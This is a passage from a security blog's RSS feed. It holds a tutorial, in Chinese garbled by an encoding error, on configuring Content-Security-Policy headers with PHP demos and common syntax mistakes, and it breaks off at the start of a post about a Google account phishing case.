&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content-Security-Policy&lt;/a&gt;ï¼ˆä»¥ä¸‹ç°¡ç¨± CSPï¼‰æ˜¯å¾ 2010 å¹´è¢«æå‡ºä¾†çš„ä¸€é … Web è¦æ ¼ï¼Œä¸»è¦ç›®çš„æ˜¯ç”¨ä¾†é˜²æ­¢ Cross-Site Scriptingï¼ˆä»¥ä¸‹ç°¡ç¨± XSSï¼‰è·Ÿç¶²é æ¨£å¼ç½®æ›ï¼ˆä¾‹å¦‚&lt;a href=&quot;https://web.archive.org/web/20140321184408/http://udn.com:80/NEWS/NATIONAL/NAT5/8554327.shtml&quot;&gt;ç§‘æŠ€éƒ¨è¢«æƒ¡æ&lt;/a&gt;å°±æ˜¯ä¸€å€‹æœ€å¥½çš„ä¾‹å­ï¼‰ã€‚ç¶“éäº”å¹´ç™¼å±•ï¼ŒCSP 1.0 å·²å¾ W3C çš„ TR (Technical Report) è®Šæˆ &lt;a href=&quot;http://www.w3.org/TR/CSP/&quot;&gt;Candidate Recommendation&lt;/a&gt;ï¼Œæ‡‰è©²ä¸ä¹…å°±æœƒå°‡æˆç‚º W3C æ¨è–¦æ¨™æº–ã€‚æ–°çš„ &lt;a href=&quot;http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html&quot;&gt;CSP 1.1&lt;/a&gt; å‰‡ä»åœ¨è‰æ¡ˆéšæ®µã€‚&lt;/p&gt;

&lt;p&gt;CSP å®¶æ—é¾å¤§ï¼Œç¸½å…±æœ‰ä¸‰å€‹é¡åˆ¥ï¼Œå…­å€‹é …ç›®ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP-Report-Only&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;åœ¨ CSP ç™¼å±•åˆæœŸï¼Œä¸»æµç€è¦½å™¨ä¸¦æœªå…¨éƒ¨ä¾ç…§åŒä¸€æ¨™æº–ä¾†é–‹ç™¼ï¼Œå› æ­¤ç™¼å±•æˆé€™ä¸‰ç¨®é¡åˆ¥ã€‚ç›®å‰ç”±æ–¼ CSP 1.0 å³å°‡æˆç‚ºæ¨™æº–ï¼Œå¤§å¤šæ•¸ç€è¦½å™¨å·²æ”¯æ´ Content-Security-Policy é€™å€‹é¡åˆ¥ï¼Œå› æ­¤ç‹€æ³å·²é€æ¼¸æ”¶æ–‚ã€‚ä¸»æµç€è¦½å™¨çš„æ”¯æ´åˆ—è¡¨å¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; title=&quot;Content-Security-Policy ç€è¦½å™¨æ”¯æ´åˆ—è¡¨&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; alt=&quot;Content-Security-Policy ç€è¦½å™¨æ”¯æ´åˆ—è¡¨&quot; title=&quot;Content-Security-Policy ç€è¦½å™¨æ”¯æ´åˆ—è¡¨&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾åˆ—è¡¨ä¸­å¯çœ‹åˆ°ï¼Œåªè¦ä½¿ç”¨ Content-Security-Policy èˆ‡ X-Content-Security-Policy å°±å·²æœ‰å¾ˆé«˜çš„è¦†è“‹ç‡ï¼Œé™¤éè¦æ”¯æ´ Safari 6ï¼Œå¦å‰‡ä¸ç”¨ç‰¹æ„ä½¿ç”¨ X-WebKit-CSPã€‚æ›´è©³ç´°çš„ç€è¦½å™¨æ”¯æ´åˆ—è¡¨å¯åƒè€ƒ &lt;a href=&quot;http://caniuse.com/contentsecuritypolicy&quot;&gt;Can I use&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;csp-10-ä¸»è¦ä½œç”¨&quot;&gt;CSP 1.0 ä¸»è¦ä½œç”¨&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;è¼‰å…¥ä¾†æºç™½åå–®&lt;/p&gt;

    &lt;p&gt;å®£å‘Šä¸€çµ„å—ä¿¡ä»»çš„ç™½åå–®èˆ‡è³‡æºç¨®é¡ï¼ˆå¦‚ JavaScript, CSS, image ç­‰ç­‰ï¼‰ï¼Œä½¿ç€è¦½å™¨åªèƒ½å¾æ­¤ç™½åå–®ä¸­è¼‰å…¥è³‡æºï¼Œè—‰æ­¤é˜²æ­¢æ”»æ“Šè€…å¾å¤–éƒ¨å¼•å…¥å«æœ‰æƒ¡æ„ç¨‹å¼ç¢¼çš„è³‡æºã€‚&lt;/p&gt;

    &lt;p&gt;ä¾‹ï¼šContent-Security-Policy: default-src â€˜selfâ€™; script-src â€˜selfâ€™ http://js.devco.re; style-src â€˜selfâ€™ http://css.devco.re; img-src â€˜selfâ€™ data:; frame-src â€˜noneâ€™&lt;/p&gt;

    &lt;p&gt;æ•ˆæœï¼šé™å®š script è³‡æºåªèƒ½å¾ http://js.devco.re è¼‰å…¥ï¼›é™å®š style è³‡æºåªèƒ½å¾ http://css.devco.re è¼‰å…¥ï¼›é™å®š img åªèƒ½å¾ç›¸åŒ domain è¼‰å…¥ï¼Œä¸¦ä¸”æ”¯æ´ data schemeï¼›é™å®š frame ä¸èƒ½å¾ä»»ä½•ä¾†æºè¼‰å…¥ï¼›é™¤äº† scriptã€styleã€imgã€frame ä¹‹å¤–çš„è³‡æºï¼Œå‰‡åªèƒ½å¾åŒæ¨£ domain ä»¥åŠåŒæ¨£å”å®šçš„ä¾†æºè¼‰å…¥ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç¦æ­¢ inline ç¨‹å¼ç¢¼&lt;/p&gt;

    &lt;p&gt;ä¸€èˆ¬äººé–‹ç™¼ç¶²ç«™æ™‚ç‚ºæ±‚ä¾¿åˆ©ï¼Œç¶“å¸¸æœƒåœ¨ HTML ä¸­å¯«å…¥ä¸€äº› inline ç¨‹å¼ç¢¼ï¼Œä½†æ”»æ“Šè€…æ„åœ–å…¥ä¾µç¶²ç«™æ™‚ä¹Ÿå¸¸ç”¨æ­¤æ‰‹æ³•ã€‚ç„¶è€Œç€è¦½å™¨å…¶å¯¦ç„¡æ³•åˆ†è¾¨é€™äº› inline ç¨‹å¼ç¢¼ç©¶ç«Ÿæ˜¯é–‹ç™¼äººå“¡å¯«çš„ï¼Œé‚„æ˜¯æ”»æ“Šè€…æ¤å…¥çš„ã€‚å› æ­¤ CSP ä¹¾è„†å¼·è¿«é–‹ç™¼è€…å¿…é ˆæŠŠæ‰€æœ‰ inline ç¨‹å¼ç¢¼ç§»åˆ°å¤–éƒ¨æª”æ¡ˆï¼Œå®Œå…¨æœçµ•åœ¨ HTML ä¸­å‡ºç¾ inline ç¨‹å¼ç¢¼çš„ç‹€æ³ã€‚å› æ­¤é™¤éä½ åœ¨ CSP å®£å‘Šæ™‚æœ‰è¨»æ˜ â€˜unsafe-inlineâ€™ï¼Œå¦å‰‡ CSP é è¨­ç¦æ­¢ä½¿ç”¨ inline script æˆ– inline CSSã€‚&lt;/p&gt;

    &lt;p&gt;ä¾‹ï¼šContent-Security-Policy: default-src â€˜selfâ€™; script-src â€˜unsafe-inlineâ€™&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç¦æ­¢ eval å‡½å¼&lt;/p&gt;

    &lt;p&gt;eval() å°è¨±å¤šé–‹ç™¼è€…ä¾†èªªä¸€ç›´æ˜¯å€‹éå¸¸æ–¹ä¾¿çš„å‡½å¼ï¼Œç„¶è€Œè‹¥ç¼ºä¹è³‡å®‰è§€å¿µï¼Œä½¿ç”¨æ­¤å‡½å¼æ™‚å¾ˆå¯èƒ½æœƒå°è‡´æ½›åœ¨çš„ XSS é¢¨éšªã€‚å› æ­¤é™¤éä½ åœ¨ CSP å®£å‘Šæ™‚æœ‰è¨»æ˜ â€˜unsafe-evalâ€™ï¼Œå¦å‰‡ CSP é è¨­ç¦æ­¢ä½¿ç”¨ eval() å‡½å¼ã€‚&lt;/p&gt;

    &lt;p&gt;ä¾‹ï¼šContent-Security-Policy: default-src â€˜selfâ€™; script-src â€˜unsafe-evalâ€™&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;é˜²æ­¢ sniffer&lt;/p&gt;

    &lt;p&gt;ç”±æ–¼ CSP å¯æŒ‡å®šè¼‰å…¥è³‡æºæ™‚å¼·åˆ¶ä½¿ç”¨ https å”å®šï¼Œå› æ­¤å¯é™ä½è¢« sniffing çš„æ©Ÿç‡ã€‚&lt;/p&gt;

    &lt;p&gt;ä¾‹ï¼šContent-Security-Policy: default-src http://devco.re; img-src https:&lt;/p&gt;

    &lt;p&gt;æ•ˆæœï¼šé™å®šåœ–ç‰‡åªèƒ½å¾ https å”å®šè¼‰å…¥ï¼Œä¸é™å®š domainã€‚è€Œé™¤äº†åœ–ç‰‡ä¹‹å¤–çš„è³‡æºå‰‡å¯å¾ä»»æ„ä¾†æºè¼‰å…¥ã€‚&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;csp-demo&quot;&gt;CSP Demo&lt;/h3&gt;

&lt;p&gt;ä¸‹é¢é€™ä¸€æ®µç¨‹å¼ç¢¼ï¼Œä½¿ç”¨ default-src * è®“ç›¸é—œè³‡æºå¯æ­£å¸¸é¡¯ç¤ºï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy: default-src *&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;title&amp;gt;CSP Demo Site&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;h3&amp;gt;Content Security Policy Demo Site&amp;lt;/h3&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;img width=&amp;quot;200&amp;quot; height=&amp;quot;200&amp;quot; src=&amp;quot;http://devco.re/assets/themes/devcore/images/double-sticker.png&amp;quot;&amp;gt;&amp;lt;/img&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;iframe frameborder=&amp;#39;0&amp;#39; width=&amp;#39;300&amp;#39; height=&amp;#39;200&amp;#39; src=&amp;#39;http://www.youtube.com/embed/E-BGf1MwecU&amp;#39;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; title=&quot;ä½¿ç”¨æœ€å¯¬é¬†çš„ Content-Security-Policy è¦å‰‡&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; alt=&quot;ä½¿ç”¨æœ€å¯¬é¬†çš„ Content-Security-Policy è¦å‰‡&quot; title=&quot;ä½¿ç”¨æœ€å¯¬é¬†çš„ Content-Security-Policy è¦å‰‡&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†æˆ‘å€‘å°‡ php header çš„é‚£ä¸€è¡Œç¨‹å¼ç¢¼ä¿®æ”¹å¦‚ä¸‹ä¸¦ä¸” reload ç€è¦½å™¨é é¢ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy: default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; title=&quot;ä½¿ç”¨ Content-Security-Policy é™åˆ¶ img èˆ‡ frame çš„ä¾†æº&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; alt=&quot;ä½¿ç”¨ Content-Security-Policy é™åˆ¶ img èˆ‡ frame çš„ä¾†æº&quot; title=&quot;ä½¿ç”¨ Content-Security-Policy é™åˆ¶ img èˆ‡ frame çš„ä¾†æº&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä½¿ç”¨ CSP é™åˆ¶ img èˆ‡ frame çš„ä¾†æºç¨®é¡å¾Œï¼Œæˆ‘å€‘å¯ä»¥å¾ä¸Šåœ– Chrome Inspector çš„ç´…å­—è§€å¯Ÿåˆ°ï¼Œç¶²ç«™çš„åœ–ç‰‡èˆ‡ iframe å½±ç‰‡å·²è¢«ç€è¦½å™¨æ“‹æ‰ï¼Œç„¡æ³•è¼‰å…¥ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœæ“”å¿ƒç›´æ¥ä½¿ç”¨ CSP æœƒå½±éŸ¿ç¶²ç«™ç‡Ÿé‹ï¼Œä½†åˆæƒ³å˜—è©¦ CSPï¼Œå¯ä»¥å…ˆä½¿ç”¨ Content-Security-Policy-Report-Onlyï¼Œç¤ºç¯„å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy-Report-Only: default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;; report-uri http://devco.re/demo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; title=&quot;Content-Security-Policy-Report-Only&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; alt=&quot;Content-Security-Policy-Report-Only&quot; title=&quot;Content-Security-Policy-Report-Only&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç”±ä¸Šåœ–å¯ä»¥çœ‹åˆ°ï¼Œæ­¤ header ä¸æœƒç›´æ¥é˜»æ“‹ä¸ç¬¦åˆ CSP è¦ç¯„çš„è³‡æºï¼Œä½†æ˜¯æœƒæ ¹æ“šä½¿ç”¨è€…æ‰€é•åçš„è¦å‰‡ç™¼é€ç›¸å°æ‡‰çš„ POST request è‡³æŒ‡å®šçš„ URIï¼Œç™¼é€å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;quot;csp-report&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;blocked-uri&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;http://devco.re/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;document-uri&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;http://yoursite.com/csp.php&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;original-policy&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;; report-uri http://devco.re/demo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;referrer&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;status-code&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;violated-directive&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;img-src https:&amp;quot;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;ç”±ç™¼é€å…§å®¹å¯çœ‹å‡ºé€™å€‹ request å› ç‚ºé•åäº†ã€Œimg-src https:ã€è¦å‰‡è€Œå°‡ã€Œhttp://devco.re/ã€é€™å€‹ä¾†æºæ“‹æ‰ã€‚ç¶“ç”±æ­¤æ–¹å¼ï¼Œå¯ä¸€é‚Šä¿®æ”¹ç¶²ç«™ä¸€é‚Šè§€å¯Ÿæ˜¯å¦ä»æœ‰ä¸ç¬¦åˆ CSP è¦ç¯„ä¹‹è™•ï¼Œç­‰åˆ°æ‰€æœ‰é•è¦çš„å…§å®¹éƒ½ä¿®æ­£å®Œç•¢å¾Œï¼Œå†å°‡ CSP å¥—ç”¨åˆ°æ­£å¼ä¸Šç·šç’°å¢ƒã€‚&lt;/p&gt;

&lt;p&gt;ç”±æ–¼å®£å‘Šæ–¹å¼éå¸¸å¤šç¨®ï¼Œåœ¨é€™é‚Šå°±ä¸ä¸€ä¸€æ¢åˆ—ï¼Œè‹¥æœ‰èˆˆè¶£å¯å‰å¾€ &lt;a href=&quot;https://content-security-policy.com/&quot;&gt;Content Security Policy Reference &amp;amp; Examples&lt;/a&gt;ã€&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;Using Content Security Policy - Security | MDN&lt;/a&gt; ç­‰ç¶²é ï¼Œæœ‰æ›´å®Œæ•´çš„ä½¿ç”¨æƒ…å¢ƒèˆ‡ç¯„ä¾‹å¯ä¾›åƒè€ƒã€‚å¦å¤–ä¹Ÿæœ‰ &lt;a href=&quot;http://benvinegar.github.io/csp-talk-2013/&quot;&gt;Slide&lt;/a&gt; (by Ben Vinegar) è·Ÿ &lt;a href=&quot;https://www.youtube.com/watch?v=pocsv39pNXA&quot;&gt;YouTube å½±ç‰‡&lt;/a&gt; (by Adam Barth) å¯åƒè€ƒã€‚&lt;/p&gt;

&lt;h3 id=&quot;csp-å¯¦éš›ä½¿ç”¨æ¡ˆä¾‹&quot;&gt;CSP å¯¦éš›ä½¿ç”¨æ¡ˆä¾‹&lt;/h3&gt;

&lt;p&gt;ç›®å‰æ¡ç”¨ CSP çš„æ¡ˆä¾‹è¼ƒå°‘ï¼Œæ¯”è¼ƒçŸ¥åçš„ä½¿ç”¨æ¡ˆä¾‹æ˜¯ &lt;a href=&quot;https://github.com/&quot;&gt;GitHub&lt;/a&gt;ï¼Œåœ¨ 2013 å¹´ 4 æœˆ &lt;a href=&quot;https://github.com/blog/1477-content-security-policy&quot;&gt;GitHub é‚„å¯«äº†ä¸€ç¯‡å°ˆæ–‡&lt;/a&gt;å…¬å‘Šè¡¨ç¤ºä»–å€‘å·²é–‹å§‹æ¡ç”¨ CSPã€‚å¦å¤–ä¸€å€‹æ¡ˆä¾‹å» å•†å¯èƒ½è¼ƒå»£ç‚ºäººçŸ¥ï¼Œæ˜¯åœ¨ 2013 å¹´ç•¶ç´…çš„å…è²»å„²å­˜ç©ºé–“ &lt;a href=&quot;https://mega.co.nz/&quot;&gt;MEGA&lt;/a&gt;ã€‚å…©å€‹æ¡ˆä¾‹çš„å¯¦éš›å…§å®¹å¯è¦‹æ–¼ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; title=&quot;GitHub èˆ‡ MEGA ä½¿ç”¨ CSP å¾Œçš„ HTTP response&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; alt=&quot;GitHub èˆ‡ MEGA ä½¿ç”¨ CSP å¾Œçš„ HTTP response&quot; title=&quot;GitHub èˆ‡ MEGA ä½¿ç”¨ CSP å¾Œçš„ HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦ä¸€é …çŸ¥åä½¿ç”¨æ¡ˆä¾‹æ˜¯ Google æ˜å®š&lt;a href=&quot;https://developer.chrome.com/extensions/contentSecurityPolicy&quot;&gt;é–‹ç™¼ Chrome Extension æ™‚å¿…é ˆä½¿ç”¨ CSP&lt;/a&gt;ï¼Œä»¥è¿½æ±‚æ›´é«˜çš„å®‰å…¨æ€§ã€‚Mozilla ä¹Ÿåœ¨ &lt;a href=&quot;https://wiki.mozilla.org/Security/CSP/Specification&quot;&gt;MozillaWiki é–‹äº†ä¸€é &lt;/a&gt;å­˜æ”¾ç›¸é—œæŠ€è¡“ç´°ç¯€ã€‚è‹¥æ‚¨æƒ³è§€å¯Ÿå…¶ä»–ä½¿ç”¨æ¡ˆä¾‹ï¼Œå¯ä½¿ç”¨ Chrome Inspector æˆ– curl è§€å¯Ÿä»¥ä¸‹å¹¾å€‹ç¶²ç«™ï¼š&lt;a href=&quot;https://lastpass.com/&quot;&gt;LastPass&lt;/a&gt;ï¼Œ&lt;a href=&quot;https://twitter.com/&quot;&gt;Twitter&lt;/a&gt;ï¼Œ&lt;a href=&quot;https://1password.com/&quot;&gt;1Password&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;csp-å¸¸è¦‹èª¤ç”¨æ¡ˆä¾‹&quot;&gt;CSP å¸¸è¦‹èª¤ç”¨æ¡ˆä¾‹&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;directives å¾Œé¢ä¸éœ€åŠ å†’è™Ÿ&lt;/p&gt;

    &lt;p&gt;éŒ¯èª¤ï¼šdefault-src: â€˜selfâ€™&lt;/p&gt;

    &lt;p&gt;æ­£ç¢ºï¼š&lt;strong&gt;default-src â€˜selfâ€™&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;directives ä¹‹é–“ä»¥åˆ†è™Ÿå€éš”&lt;/p&gt;

    &lt;p&gt;éŒ¯èª¤ï¼šdefault-src â€˜selfâ€™, script-src â€˜selfâ€™&lt;/p&gt;

    &lt;p&gt;æ­£ç¢ºï¼š&lt;strong&gt;default-src â€˜selfâ€™; script-src â€˜selfâ€™&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;å¤šå€‹ source ä¹‹é–“åƒ…ä»¥ç©ºç™½å€éš”&lt;/p&gt;

    &lt;p&gt;éŒ¯èª¤ï¼šdefault-src â€˜selfâ€™; img-src â€˜selfâ€™, img1.devco.re, img2.devco.re&lt;/p&gt;

    &lt;p&gt;æ­£ç¢ºï¼š&lt;strong&gt;default-src â€˜selfâ€™; img-src â€˜selfâ€™ img1.devco.re img2.devco.re&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸäº› source å¿…é ˆåŠ å†’è™Ÿï¼ˆhttps:ã€data:ï¼‰&lt;/p&gt;

    &lt;p&gt;éŒ¯èª¤ï¼šdefault-src â€˜selfâ€™; img-src â€˜selfâ€™ https data&lt;/p&gt;

    &lt;p&gt;æ­£ç¢ºï¼š&lt;strong&gt;default-src â€˜selfâ€™; img-src â€˜selfâ€™ https: data:&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸäº› source å¿…é ˆç”¨å–®å¼•è™Ÿæ‹¬èµ·ä¾†ï¼ˆâ€™noneâ€™ã€â€™selfâ€™ã€â€™unsafe-inlineâ€™ã€â€™unsafe-evalâ€™ï¼‰&lt;/p&gt;

    &lt;p&gt;éŒ¯èª¤ï¼šscript-src self unsafe-inline unsafe-eval&lt;/p&gt;

    &lt;p&gt;æ­£ç¢ºï¼š&lt;strong&gt;script-src â€˜selfâ€™ â€˜unsafe-inlineâ€™ â€˜unsafe-evalâ€™&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;ä½¿ç”¨ CSP å¯ä»¥æœ‰æ•ˆæå‡æ”»æ“Šé›£åº¦ï¼Œè®“è¨±å¤šå¸¸è¦‹çš„ XSS æ”»æ“Šå¤±æ•ˆï¼Œæ˜¯ä¸€å€‹éå¸¸æ¨è–¦é–‹ç™¼è€…ä½¿ç”¨çš„ HTTP headerã€‚ä½†ç”±æ–¼ç›®å‰çš„é–‹ç™¼è€…åœ¨ HTML è£¡é¢å¯« inline script åŠ inline CSS çš„æ¯”ä¾‹éå¸¸é«˜ï¼ŒåŒæ™‚ä¹Ÿæœ‰ä¸€äº›ç¶²è·¯æœå‹™é è¨­éƒ½éœ€è¦ä½¿ç”¨ inline scriptï¼ˆä¾‹å¦‚ Google Analyticsï¼Œç›¸é—œè§£æ³•å¯åƒè€ƒ&lt;a href=&quot;http://stackoverflow.com/questions/3870345/new-google-analytics-code-into-external-file&quot;&gt;é€™è£¡&lt;/a&gt;ï¼‰ï¼Œå› æ­¤è¦äº«å—é€™æ¨£çš„å®‰å…¨ä¹‹å‰ï¼Œå¯èƒ½éœ€è¦å…ˆä»˜å‡ºè¨±å¤šæ™‚é–“èˆ‡å¿ƒåŠ›å°‡ç¶²ç«™å¤§å¹…æ•´ç†ï¼Œå¥—ç”¨ CSP è¦ç¯„å¾Œç¶²é æ‰èƒ½æ­£å¸¸é‹ä½œã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/</link>
                <guid>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy</guid>
                <pubDate>Tue, 08 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Google å¸³è™Ÿé‡£é­šæ¡ˆä¾‹</title>
                <description>&lt;p&gt;æœ€è¿‘èº«é‚Šçš„æœ‹å‹ä¸æ–·çš„æ”¶åˆ° Gmail ä¸­ Google çš„è­¦å‘Šï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-01.png&quot; alt=&quot;Gmail state-sponsored attacker warning&quot; title=&quot;Gmail state-sponsored attacker warning&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-03.png&quot; alt=&quot;Gmail åœ‹å®¶è³‡åŠ©çš„æ”»æ“Šè€…è­¦å‘Š&quot; title=&quot;Gmail åœ‹å®¶è³‡åŠ©çš„æ”»æ“Šè€…è­¦å‘Š&quot; /&gt;&lt;/p&gt;

